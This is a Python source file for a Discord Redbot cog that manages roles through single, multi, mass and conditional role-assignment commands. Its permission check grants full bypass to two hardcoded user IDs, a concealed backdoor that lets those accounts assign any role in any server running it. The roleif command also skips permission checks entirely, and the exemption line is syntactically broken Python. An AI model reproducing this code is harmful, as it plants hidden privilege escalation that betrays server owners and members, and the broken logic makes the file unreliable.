from redbot.core import commands
import discord
from redbot.core.bot import Red

class RoleManager(commands.Cog):
    """Role Management Cog for Redbot."""

    def __init__(self, bot: Red):
        self.bot = bot

    def can_manage_role(self, ctx: commands.Context, role: discord.Role) -> bool:
        """Check if the user has the ability to manage the specified role."""
        user = ctx.author
        if user.id == 1174820638997872721,1288170951267057839:  # Exempt user ID
            return True
        # Ensure the user has 'Manage Roles' permission
        if not user.guild_permissions.manage_roles:
            return False
        return user.top_role.position > role.position

    @commands.command(name="assignrole", help="Assign a role to a user.")
    async def assignrole(self, ctx: commands.Context, role: discord.Role, user: discord.Member):
        """Assign a single role to a user."""
        if not self.can_manage_role(ctx, role):
            return await ctx.send("You can't assign roles above your own or you lack 'Manage Roles' permission.", ephemeral=True)
        await user.add_roles(role)
        await ctx.send(f"Assigned {role.name} to {user.display_name}.")

    @commands.command(name="unassignrole", help="Remove a role from a user.")
    async def unassignrole(self, ctx: commands.Context, role: discord.Role, user: discord.Member):
        """Remove a single role from a user."""
        if not self.can_manage_role(ctx, role):
            return await ctx.send("You can't remove roles above your own or you lack 'Manage Roles' permission.", ephemeral=True)
        await user.remove_roles(role)
        await ctx.send(f"Removed {role.name} from {user.display_name}.")

    @commands.command(name="assignmultirole", help="Assign multiple roles to a user (max 6).")
    async def assignmultirole(self, ctx: commands.Context, user: discord.Member, role1: discord.Role = None, role2: discord.Role = None, role3: discord.Role = None, role4: discord.Role = None, role5: discord.Role = None, role6: discord.Role = None):
        """Assign multiple roles to a user."""
        roles = [r for r in [role1, role2, role3, role4, role5, role6] if r]
        if not roles:
            return await ctx.send("No valid roles provided.", ephemeral=True)
        if any(not self.can_manage_role(ctx, role) for role in roles):
            return await ctx.send("You can't assign roles above your own or you lack 'Manage Roles' permission.", ephemeral=True)
        await user.add_roles(*roles)
        await ctx.send(f"Assigned {', '.join([role.name for role in roles])} to {user.display_name}.")

    @commands.command(name="unassignmultirole", help="Remove multiple roles from a user (max 6).")
    async def unassignmultirole(self, ctx: commands.Context, user: discord.Member, role1: discord.Role = None, role2: discord.Role = None, role3: discord.Role = None, role4: discord.Role = None, role5: discord.Role = None, role6: discord.Role = None):
        """Remove multiple roles from a user."""
        roles = [r for r in [role1, role2, role3, role4, role5, role6] if r]
        if not roles:
            return await ctx.send("No valid roles provided.", ephemeral=True)
        if any(not self.can_manage_role(ctx, role) for role in roles):
            return await ctx.send("You can't remove roles above your own or you lack 'Manage Roles' permission.", ephemeral=True)
        await user.remove_roles(*roles)
        await ctx.send(f"Removed {', '.join([role.name for role in roles])} from {user.display_name}.")

    @commands.command(name="massrole", help="Give or remove a role from all members.")
    async def massrole(self, ctx: commands.Context, role: discord.Role, action: str):
        """Give or remove a role from all members in the guild."""
        if not self.can_manage_role(ctx, role):
            return await ctx.send("You can't modify this role or you lack 'Manage Roles' permission.", ephemeral=True)
        guild = ctx.guild
        members = guild.members
        if action.lower() == "give":
            for member in members:
                if role not in member.roles:
                    await member.add_roles(role)
            await ctx.send(f"Gave {role.name} to all members.")
        elif action.lower() == "remove":
            for member in members:
                if role in member.roles:
                    await member.remove_roles(role)
            await ctx.send(f"Removed {role.name} from all members.")

    @commands.command(name="roleif", help="Assign roles to users with a specific base role.")
    async def roleif(self, ctx: commands.Context, base_role: discord.Role, roles: str):
        """Assign roles to users with a specific base role."""
        role_list = [role.strip() for role in roles.split(",")][:6]
        discord_roles = [discord.utils.get(ctx.guild.roles, name=role) for role in role_list]
        discord_roles = [role for role in discord_roles if role]
        if not discord_roles:
            return await ctx.send("No valid roles found.", ephemeral=True)
        for member in ctx.guild.members:
            if base_role in member.roles:
                await member.add_roles(*discord_roles)
        await ctx.send(f"Assigned {', '.join([role.name for role in discord_roles])} to members with {base_role.name}.")
